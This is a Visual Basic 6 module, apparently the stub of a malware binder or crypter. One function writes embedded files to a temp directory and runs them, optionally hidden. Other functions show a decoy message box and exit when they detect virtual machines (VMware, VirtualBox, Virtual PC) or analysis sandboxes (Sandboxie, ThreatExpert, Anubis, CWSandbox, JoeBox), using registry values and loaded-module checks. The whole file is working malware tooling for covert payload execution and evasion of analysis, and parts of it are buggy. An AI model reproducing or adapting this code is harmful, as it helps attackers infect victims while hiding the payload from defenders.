Attribute VB_Name = "mFunctions"
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Public Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long

Public Type MODULEENTRY32
    dwSize As Long
    th32ModuleID As Long
    th32ProcessID As Long
    GlblcntUsage As Long
    ProccntUsage As Long
    modBaseAddr As Byte
    modBaseSize As Long
    hModule As Long
    szModule As String * 256
    szExePath As String * 1024
End Type

Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8
Const SW_HIDE = 0
Const SW_SHOWNORMAL = 1

Public Buff() As Byte, File As String, fDat() As String, x As Integer, xBuff As String, fExt As String
Public fBuff As String, pDat() As String, fPath As String, fExec As String, fVisible As String, sNum As Integer

Public Function fExtract(sFile As String, Path As String, Exec As String, Visible As String, Ext As String)
  sNum = sNum + 1
  File = FreeFile
  Path = Environ(Replace(Path, "%", ""))
  Open Path & "\tmp" & sNum & Ext For Binary As File
   Put File, , sFile
  Close File
  If Exec = "Yes" And Visible = "Yes" Then Call ShellExecute(0, "", Path & "\tmp" & sNum & Ext, "", "", SW_SHOWNORMAL)
  If Exec = "Yes" And Visible = "No" Then Call ShellExecute(0, "", Path & "\tmp" & sNum & Ext, "", "", SW_HIDE)
End Function

Public Function PrincipalData(mSG As String, tTl As String, tyP As String, Anb As String, VM As String, vBox As String, vPC As String, sBox As String, jBox As String, sBoxie As String, cThreat As String)
 Select Case tyP
  Case "Error": tyP = vbCritical
  Case "Information": tyP = vbInformation
  Case "Exclamation": tyP = vbExclamation
  Case "Question": tyP = vbQuestion
 End Select
 If mSG <> "" Or tTl <> "" Then MsgBox mSG, tyP, tTl
 
 If Anb = 1 Then If IsInSandbox = 3 Then End
 If VM = 1 Then If IsVirtualPCPresent = 2 Then End
 If vBox = 1 Then If IsVirtualPCPresent = 3 Then End
 If vPC = 1 Then If IsVirtualPCPresent = 1 Then End
 If sBox = 1 Then If IsInSandbox = 4 Then End
 If jBox = 1 Then If IsInSandbox = 5 Then End
 If sBoxie = 1 Then If IsInSandbox = 1 Then End
 If cThreat = 1 Then If IsInSandbox = 2 Then End
End Function

Public Function IsVirtualPCPresent() As Long
    Dim lhKey       As Long
    Dim sBuffer     As String
    Dim lLen        As Long

    If RegOpenKeyEx(&H80000002, "SYSTEM\ControlSet001\Services\Disk\Enum", _
       0, &H20019, lhKey) = 0 Then
        sBuffer = Space$(255): lLen = 255
        If RegQueryValueEx(lhKey, "0", 0, 1, ByVal sBuffer, lLen) = 0 Then
            sBuffer = UCase(Left$(sBuffer, lLen - 1))
            Select Case True
                Case sBuffer Like "*VIRTUAL*":   IsVirtualPCPresent = 1
                Case sBuffer Like "*VMWARE*":    IsVirtualPCPresent = 2
                Case sBuffer Like "*VBOX*":      IsVirtualPCPresent = 3
            End Select
        End If
        Call RegCloseKey(lhKey)
    End If
End Function

' Function by RedShark

Public Function IsInSandbox() As Long
 Dim hKey As Long, hOpen As Long, hQuery As Long, hSnapShot As Long
 Dim me32 As MODULEENTRY32
 Dim szBuffer As String * 128
 
 hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId)
 me32.dwSize = Len(me32)
 Module32First hSnapShot, me32
 Do While Module32Next(hSnapShot, me32) <> 0
    If InStr(1, LCase(me32.szModule), "sbiedll.dll") > 0 Then 'Sandboxie
        IsInSandboxes = 1
    ElseIf InStr(1, LCase(me32.szModule), "dbghelp.dll") > 0 Then 'ThreatExpert
        IsInSandboxes = 2
    End If
 Loop
 CloseHandle (hSnapShot)
 If IsInSandbox = False Then
    hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, hKey)
    If hOpen = 0 Then
        hQuery = RegQueryValueEx(hKey, "ProductId", 0, REG_SZ, szBuffer, 128)
        If hQuery = 0 Then
            If InStr(1, szBuffer, "76487-337-8429955-22614") > 0 Then 'Anubis
                IsInSandboxes = 3
            ElseIf InStr(1, szBuffer, "76487-644-3177037-23510") > 0 Then 'CWSandbox
                IsInSandboxes = 4
            ElseIf InStr(1, szBuffer, "55274-640-2673064-23950") > 0 Then 'JoeBox
                IsInSandboxes = 5
            End If
        End If
    End If
    RegCloseKey (hKey)
 End If
End Function





